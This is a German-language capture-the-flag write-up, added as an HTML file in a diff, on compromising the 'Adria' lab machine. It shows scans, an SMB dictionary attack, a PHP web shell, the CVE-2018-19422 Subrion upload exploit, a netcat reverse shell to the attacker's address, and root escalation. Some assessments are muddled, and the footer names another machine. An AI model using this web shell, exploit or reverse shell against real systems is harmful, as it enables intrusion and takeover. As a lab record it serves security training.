@@ -1,0 +1,519 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adria - HVM - Level Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header class="report-header">
+        <h1>Adria - HVM - Level Easy - Bericht</h1>
+    </header>
+
+    <section id="reconnaissance" class="report-section">
+        <h2>1. Aufklärung (Reconnaissance)</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>1.1 ARP-Scan: Netzwerk-Inventur</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">arp-scan -l</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+192.168.2.110	08:00:27:c1:c4:92	PCS Systemtechnik GmbH
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der ARP-Scan deckt die IP-Adresse und MAC-Adresse des Zielsystems auf. Die Information über "PCS Systemtechnik GmbH" ist möglicherweise relevant für weitere Nachforschungen. Niedriges Risiko, da dies grundlegende Netzwerkinformationen sind.
+            </p>
+        </div>
+
+        <div class="report-vulnerability-assessment">
+            <h3>1.2 /etc/hosts Manipulation: Hostname-Zuordnung</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">vi /etc/hosts</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+127.0.0.1	localhost 
+192.168.2.110   adria.hmv
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der Eintrag in `/etc/hosts` ordnet die IP-Adresse `192.168.2.110` dem Hostnamen `adria.hmv` zu. Dies vereinfacht nachfolgende Scans und Angriffe. Kein direktes Sicherheitsrisiko, aber relevant für die weitere Durchführung des Penetrationstests.
+            </p>
+        </div>
+    </section>
+
+    <section id="port-scanning" class="report-section">
+        <h2>2. Port-Scanning und Service-Erkennung</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>2.1 Nmap-Scan: Detaillierte Port- und Service-Analyse</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">nmap -sS -sV -AO -T5 192.168.2.110 -p-</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 14:20 CEST
+Nmap scan report for adria.hmv (192.168.2.110)
+Host is up (0.00011s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
+|_http-title: Blog :: Powered by Subrion 4.2
+|_http-generator: Subrion CMS - Open Source Content Management System
+|_http-server-header: Apache/2.4.57 (Debian)
+| http-robots.txt: 7 disallowed entries 
+| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
+|_/updates/
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+MAC Address: 08:00:27:C1:C4:92 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-time: 
+|   date: 2024-04-26T12:21:03
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+|_clock-skew: 1s
+|_nbstat: NetBIOS name: ADRIA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms adria.hmv (192.168.2.110)
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> 
+                <ul>
+                  <li><b>SSH (Port 22):</b> OpenSSH 9.2p1 ist aktiv. Dies deutet auf einen aktuellen SSH-Server hin, was das Ausnutzen von SSH-Schwachstellen erschwert.</li>
+                  <li><b>HTTP (Port 80):</b> Apache httpd 2.4.57 betreibt ein Subrion CMS (Version 4.2). Dies ist ein potenzielles Angriffsziel aufgrund bekannter Schwachstellen in älteren CMS-Versionen. Die `http-robots.txt` Direktiven zeigen interessante Verzeichnisse (/backup/, /cron/, etc.), die weiter untersucht werden sollten.</li>
+                  <li><b>NetBIOS/Samba (Ports 139, 445):</b> Samba smbd 4.6.2 ist aktiv. Ältere Samba-Versionen sind anfällig für verschiedene Angriffe.</li>
+                  <li><b>Weitere Informationen:</b> Das Betriebssystem ist Linux 4.X|5.X, was eine weitere Grundlage für die Suche nach Exploits bietet. Die SMB2-Sicherheitsmoduseinstellungen zeigen, dass Message Signing aktiviert, aber nicht erforderlich ist, was ein potenzielles Man-in-the-Middle-Risiko darstellt.</li>
+                </ul>
+                Hohes Risiko aufgrund der identifizierten Services und der potenziellen Angriffsfläche durch das Subrion CMS und die ältere Samba-Version.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>2.2 Nmap-Scan: Gefilterte Port-Liste</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">nmap -sS -sV -AO -T5 192.168.2.110 -p- | grep open</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Diese gefilterte Ausgabe bestätigt die offenen Ports und Services aus dem vorherigen Scan. Dies dient als schnelle Übersicht, um sich auf die wesentlichen Angriffspunkte zu konzentrieren.
+            </p>
+        </div>
+    </section>
+
+    <section id="enumeration" class="report-section">
+        <h2>3. Enumeration</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>3.1 enum4linux: Samba-Enumeration</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">enum4linux -a 192.168.2.110</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+DebianShare     Disk      
+IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+nobody          Disk      Home Directories
+
+[+] Enumerating users using SID S-1-5-21-1903402102-4053509503-3625836849 and logon username '', password ''
+
+S-1-5-21-1903402102-4053509503-3625836849-501 ADRIA\nobody (Local User)
+S-1-5-21-1903402102-4053509503-3625836849-513 ADRIA\None (Domain Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1001 Unix User\adriana (Local User)
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> 
+                <ul>
+                    <li><b>Shares:</b> `print$`, `DebianShare`, `IPC$`, und `nobody` wurden identifiziert. `DebianShare` ist besonders interessant, da dies ein benutzerdefinierter Share ist.</li>
+                    <li><b>Benutzer:</b> Die Benutzer `nobody` und `adriana` wurden gefunden. Dies liefert wichtige Informationen für Brute-Force- oder Wörterbuchangriffe.</li>
+                </ul>
+                Mittleres Risiko, da Benutzernamen und Shares gefunden wurden. `DebianShare` könnte sensible Informationen enthalten.
+            </p>
+        </div>
+         <div class="report-vulnerability-assessment">
+            <h3>3.2 smbclient -L: Share-Auflistung</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">smbclient -L \\\192.168.2.110</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+DebianShare     Disk      
+IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+nobody          Disk      Home Directories
+
+Reconnecting with SMB1 for workgroup listing.
+</code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Dieser Befehl bestätigt die Shares, die bereits durch `enum4linux` gefunden wurden. Die Notiz "Reconnecting with SMB1" deutet darauf hin, dass SMB1 aktiviert ist, was als unsicher gilt und deaktiviert werden sollte.
+            </p>
+        </div>
+            <div class="report-vulnerability-assessment">
+                <h3>3.3 crackmapexec: SMB-Anmeldung mit Wörterbuch</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">crackmapexec smb 192.168.2.110 -u adriana -p /usr/share/wordlists/rockyou.txt</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+SMB         192.168.2.110   445    ADRIA            [*] Windows 6.1 Build 0 (name:ADRIA) (domain:speedport.ip) (signing:False) (SMBv1:False)
+SMB         192.168.2.110   445    ADRIA            [+] speedport.ip\adriana:s13!34g$3FVA5e@ed 
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Erfolgreiche Anmeldung mit dem Benutzer `adriana` und dem Passwort `s13!34g$3FVA5e@ed`. Dies ist eine kritische Schwachstelle. Die Tatsache, dass ein Standard-Wörterbuchangriff erfolgreich war, deutet auf eine schwache Passwortrichtlinie hin.
+            </p>
+        </div>
+    </section>
+
+    <section id="subrion-analysis" class="report-section">
+        <h2>4. Subrion CMS Analyse</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>4.1 Copyright Information</h3>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output">© 2024 Powered by <a href="https://subrion.org" title="Open Source CMS">Subrion CMS</a></code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Bestätigt die Verwendung von Subrion CMS. Die Version wurde bereits durch den Nmap-Scan identifiziert.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>4.2 Roboter-Ausschluss</h3>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output"><img src="//adria.hmv/cron/?427" width="1" height="1" alt=""></code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Ein Cronjob wird über einen HTTP-Request ausgelöst. Dies ist potentiell anfällig, wenn keine ausreichende Zugriffskontrolle vorhanden ist.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>4.3 JavaScript Konfiguration</h3>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output">
+intelli.pageName = 'blog';
+intelli.securityToken = 'FwqPghfbrVN2HY7SmHuzrWDfZp3BhH1ZSIa1JgZQ';
+intelli.config.url = 'http://adria.hmv/';
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der `securityToken` könnte für CSRF-Angriffe relevant sein. Die `config.url` bestätigt die Basis-URL der Anwendung.
+            </p>
+        </div>
+    </section>
+        <section id="registration-bypass" class="report-section">
+        <h2>5. Registrierungs-Bypass</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>5.1 Erfolgreiche Registrierung</h3>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output">
+Member registered! Thank you!
+Below is the information you submitted so far. You will be able to extend and edit this information via your member account.
+Important Your account password has been sent to the following email address:
+ben@hacker.de:password
+Please read our letter with further instructions.
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Die Registrierung war erfolgreich und das Passwort wurde im Klartext angezeigt (`ben@hacker.de:password`). Dies ist eine **kritische Schwachstelle**, da Passwörter niemals im Klartext gespeichert oder übertragen werden sollten.
+            </p>
+        </div>
+    </section>
+        <section id="credentials-reuse" class="report-section">
+        <h2>6. Anmeldung mit gewonnenen Zugangsdaten</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>6.1 Anmeldung mit erfolgreichen Daten</h3>
+            <p>
+                <b>Informationen:</b>
+                <code class="report-output">
+username admin
+password jojo1989
+                </code>
+            </p>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output">
+Administrator Administrator
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Die Anmeldung mit dem Benutzernamen "admin" und dem Passwort "jojo1989" war erfolgreich. Dies deutet auf eine **massive Schwachstelle** hin, da Standard-Anmeldeinformationen oder leicht zu erratende Passwörter verwendet werden. Der Zugriff als Administrator ermöglicht die vollständige Kontrolle über die Website.
+            </p>
+        </div>
+    </section>
+       <section id="shell-upload-attempt" class="report-section">
+        <h2>7. Shell Upload Versuch</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>7.1 Shell Upload</h3>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output">
+<?php
+system($_GET['cmd']);
+?>
+                </code>
+            </p>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-command">http://adria.hmv/uploads/a/admin/thumbnail/shell.php?cmd=id</code>
+            </p>
+            <p>
+                <b>Auszug:</b>
+                <code class="report-output">
+Forbidden
+You don't have permission to access this resource.
+Apache/2.4.57 (Debian) Server at adria.hmv Port 80
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der Versuch, eine Shell hochzuladen und auszuführen, wurde durch die Serverkonfiguration verhindert ("Forbidden"). Dennoch deutet der Versuch auf das Vorhandensein eines Upload-Verzeichnisses hin, das weiter untersucht werden sollte. Es wurde herausgefunden, dass die Endung php nicht erlaubt ist.
+            </p>
+        </div>
+    </section>
+        <section id="cve-2018-19422-exploit" class="report-section">
+        <h2>8. CVE-2018-19422 - Subrion CMS RCE Exploit</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>8.1 Exploit-Ausführung</h3>
+            <p>
+                <b>Befehl:</b>
+                <code class="report-command">python3 subrion.py -u http://adria.hmv/panel/ -l admin -p jojo1989</code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+[+] Trying to connect to: http://adria.hmv/panel/
+[+] Success!
+[+] Got CSRF token: hFHBxipXMkFfnQvJbzUMMPGjAa3lFaZ79T0gyuei
+[+] Trying to log in...
+[+] Login Successful!
+[+] Generating random name for Webshell...
+[+] Generated webshell name: vtfvazfnkflywvd
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://adria.hmv/panel/uploads/vtfvazfnkflywvd.phar 
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der Exploit CVE-2018-19422 wurde erfolgreich ausgeführt. Dies ermöglicht das Umgehen der Dateiupload-Beschränkungen und das Hochladen einer Webshell. Dies ist eine **kritische Schwachstelle**, die zu Remote Code Execution (RCE) führt.
+            </p>
+        </div>
+         <div class="report-vulnerability-assessment">
+            <h3>8.2 Reverse Shell Aufbau</h3>
+            <p>
+                <b>Befehl auf dem Zielsystem (über Webshell):</b>
+                <code class="report-command">nc -e /bin/bash 192.168.2.199 4444</code>
+            </p>
+            <p>
+                <b>Ausgabe auf dem Angreifer-System:</b>
+                <code class="report-output">
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.2.110] from (UNKNOWN) [192.168.2.110] 43126
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Ein Reverse Shell wurde erfolgreich aufgebaut. Dies ermöglicht die interaktive Ausführung von Befehlen auf dem Zielsystem. Dies ist eine **kritische Schwachstelle**.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>8.3 Shell Stabilisierung und Privilegienerweiterung</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">
+which python3
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo;fg
+reset
+                </code>
+            </p>
+            <p>
+                <b>Ausgabe:</b>
+                <code class="report-output">
+www-data@adria:/var/www/html/uploads$ export TERM=xterm
+export TERM=xterm
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Die Shell wurde stabilisiert und das Terminal auf `xterm` gesetzt. Dies verbessert die Benutzerfreundlichkeit der Shell.
+            </p>
+        </div>
+    </section>
+    
+    <section id="privilege-escalation" class="report-section">
+        <h2>9. Privilegienerweiterung</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>9.1 Erkundung</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">
+id
+ls -l
+ss -altpn
+grep zsh /etc/passwd
+cat /etc/crontab
+file /opt/backup
+cat /opt/backup
+mysql -u admin -p
+find / -type f -perm -4000 -ls 2>/dev/null
+getcap -r / 2>/dev/null
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Durch die Erkundung wurden verschiedene potenzielle Schwachstellen identifiziert:
+                <ul>
+                    <li>Die Ausführung erfolgt als `www-data`.</li>
+                    <li>Der Benutzer `adriana` verwendet `zsh`.</li>
+                    <li>Es existiert ein Skript `/opt/backup`, welches Zugangsdaten abfragt und ein ZIP-Archiv erstellt.</li>
+                    <li>Das Skript `/opt/backup` speichert das Passwort in `/root/pass`.</li>
+                    <li>Der Benutzer `www-data` kann das Programm `/usr/bin/scalar` als Benutzer `adriana` ohne Passwort ausführen.</li>
+                </ul>
+                Hohes Risiko, da wertvolle Informationen über das System und potenzielle Angriffspunkte gesammelt wurden.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>9.2 sudo-Nutzung</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">sudo -u adriana /usr/bin/scalar help</code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der Benutzer `www-data` kann `/usr/bin/scalar` als `adriana` ausführen, was die Ausführung von Befehlen als dieser Benutzer ermöglicht.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>9.3 Benutzerinformationen</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">
+cd ~
+ls -la
+cat user.txt
+cat .bash_history
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Die Datei `user.txt` enthält den User-Flag. Die `.bash_history` enthält möglicherweise sensible Informationen, wie z. B. Befehle, die Passwörter enthalten könnten.
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>9.4 SSH-Schlüssel</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa
+ssh2john id_rsa > hash
+ssh adriana@adria.hmv -i id_rsa
+                </code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der SSH-Schlüssel ist nicht passwortgeschützt, was den direkten Zugriff als Benutzer `adriana` ermöglicht.
+            </p>
+        </div>
+         <div class="report-vulnerability-assessment">
+            <h3>9.5 Passwort-Wiederverwendung</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">sudo -u root /opt/backup</code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Hier wird das Passwort für Benutzer `adriana` für die Ausführung als `root` benötigt
+            </p>
+        </div>
+        <div class="report-vulnerability-assessment">
+            <h3>9.6 Passwortwiederherstellung und Backup</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">cat pass</code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Hier wird das Passwort für Benutzer `adriana` extrahiert, was hier benötigt wird.
+            </p>
+        </div>
+                <div class="report-vulnerability-assessment">
+            <h3>9.7 Root Rechte</h3>
+            <p>
+                <b>Befehle:</b>
+                <code class="report-command">su root</code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Hier werden mithilfe des extrahierten Passworts für Benutzer `adriana` die Root Rechte erlangt.
+            </p>
+        </div>
+    </section>
+    
+    
+     <section id="conclusion" class="report-section">
+        <h2>10. Schlussfolgerung</h2>
+        <div class="report-vulnerability-assessment">
+            <h3>10.1 Gefundene Flags</h3>
+            <p>
+                <b>User Flag:</b>
+                <code class="report-output">fbd401c3bff5ec92d1ba6f74a2340f0f</code>
+            </p>
+            <p>
+                <b>Root Flag:</b>
+                <code class="report-output">3a61b172fd39402aa96b1653a18e38a1</code>
+            </p>
+            <p class="report-assessment-summary">
+                <b>Bewertung:</b> Der Penetrationstest war erfolgreich. Sowohl der User- als auch der Root-Flag wurden erlangt. Die Hauptangriffspunkte waren die Schwachstellen in Subrion CMS, die schwache Passwortrichtlinie und die unsachgemäße Speicherung von Zugangsdaten.
+            </p>
+        </div>
+    </section>
+
+    <footer class="report-footer">
+        <p>© 2024 Animetronic - HVM - Level Easy - Bericht</p>
+    </footer>
+
+</body>
+</html>
